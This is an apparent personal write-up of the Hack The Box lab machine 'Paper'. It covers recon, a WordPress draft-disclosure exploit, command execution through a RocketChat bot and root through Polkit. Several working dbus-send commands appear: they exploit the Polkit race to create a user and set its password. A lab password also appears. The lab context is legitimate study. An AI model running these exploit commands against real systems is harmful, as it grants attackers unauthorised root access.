# <span style="color:#CC6699">Machine #19 (Active) Paper</span>  


## <span style="color:#CC6699">Notes During Working on the Machine 🧐🤓   

* Found this in the headers of the response of the http and https. Seems interesting  
  ```
  Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
  ```  
* In the body there's this tag that had the following  
  ```html
   <meta name="generator" content="HTML Tidy for HTML5 for Linux version 5.7.28">
  ```  
* What is HTML Tidy and is it relevant? Doesn't seem like it's much  

* Based on Wappalyzer's results the web server is Apache.

* Research fastcgi.
* `gobuster dir -u 10.10.11.143 -x php,cgi,txt,html,md -w ./apache.fuzz.txt -b '404,403,400' -o apache.output.fuzz.txt`
* I think I'm gonna go back to it later.
* The cgi seems like the right path. I think.
* Quoted from Apache's documentation 
  <blockquote>
  It is favored by the PHP developers
  </blockquote>  
  This means that it's a high probability that the backend is written in php.

* I tried an apache exploit for cgi-bin it returned 404 but what was interesting is the `X-Backend-Server` header in the response   
  ```
  HTTP/1.1 404 Not Found
  Date: Fri, 11 Mar 2022 10:41:51 GMT
  Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
  X-Backend-Server: office.paper //I'm thinking this could be a virtual host of some kind
  Content-Length: 196
  Content-Type: text/html; charset=iso-8859-1
  ```  

* Turns out it is some kind of a virtual host and when I opened `http://office.paper` I got another response but the `https` didn't give me anything.
* The website seems to be using REST APIs. What made me think this is the structure of the url `http://office.paper/index.php/2021/06/19/feeling-alone/`  

* So nick is revealing more than he should  
  <img src="./nick.png">  

* So it seems like the website is using *Wordpress* and it's written in *php*.
* `prisonmike` seems like he is the only user that can login. It's not working as the username for the wordpress login
* Seems like the user `nick` exists  
  <img src="./nick_login.png">

* Found this path in source code `http://office.paper/wp-content/uploads/2021/06/Dunder_Mifflin_Inc-150x150.png` for an image it might be useful.  
* Found Wordpress version  
  ```html
  <!-- generator="WordPress/5.2.3" -->
  ```  
* Found this subdomain `http://chat.office.paper/home` and a draft that I found by using an exploit I found for the specific wordpress version we have.  
* Found a bot that I can ask to list files on the system. I can cat the files only.
* `gobuster dns -d office.paper -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt`  

* Queenofblad3s!23

* dwightschrute


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$9S6xxwc8VPUCYQuU$KrtrLFCbnH8q6uZzOtB7KW7efCn4BMlTJGGAaqSTFi0' string:GoldenEye & sleep 0.008s ; kill $!

* Polkit exploitation that the exact operating system that we have is vulnerable to. It has the exact specifications that allow this exploit to succeed
<br/><br/>

time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1



dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.031s ; kill $!


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$7Bmgdl.nOd4aCvZT$aJYFtjdy7Q1k4nj4BYOmkLJwy9LRyHKANHlGwDtXgz2' string:GoldenEye & sleep 0.037s ; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.004s ; kill $!


dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$DZLSLHAIcAsGYarl$J31FNwHG4ZOf7hu0.LmuX13.y1xl9xz8HnySsPaMaK7' string:GoldenEye & sleep 0.035s ; kill $!

$5$1dKf1P7dhcB2i1QA$PQJrOE013sKIrqLOaWbdPTWpFFW0qhJV2f4ckr0WM28

## <span style="color:#CC6699">How Did I Solve the Machine 😎🥳 

1. Found a header that had `X-Backend-Server:office.paper` and when I tried to put `office.paper` as the domain for http it opened up a whole new website which meant that there are "Virtual Hosts".  
2. The website works on Wordpress.
3. Found an exploit after I bruteforced for files and directories for the specific version of WordPress we had.
4. If I put the parameter `?static=1` to any page it could open up secrets ( I think it shows me a test page or sth like that Imma research this).
5. When using the exploit I found a url for a subdomain that uses "rocketchat" and you can't register unless we had a specific url.
6. After registering I found a bot that I can straight up send commands to.
7. After some research I found that if I put the word `run` before any comand I can run anything I want. So I put a reverse shell and easily got foothold in the system.  
8. I kept researching the system for something until I found that it was vulnerable for a Polkit exploit. The exact OS version and whatever the exploit needs I have. This got me root.

<br/><br/>



## <span style="color:#CC6699">Where I Got Stuck?😡😧  

* I got stuck researching the system for a way to privesc until I updated linpeas and found a polkit vulnerability in the operating system.

<br/><br/>



## <span style="color:#CC6699">What Did I learn from this Machine?👀  

* Bots can sometimes be a vulnerability.

<br/><br/>



<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->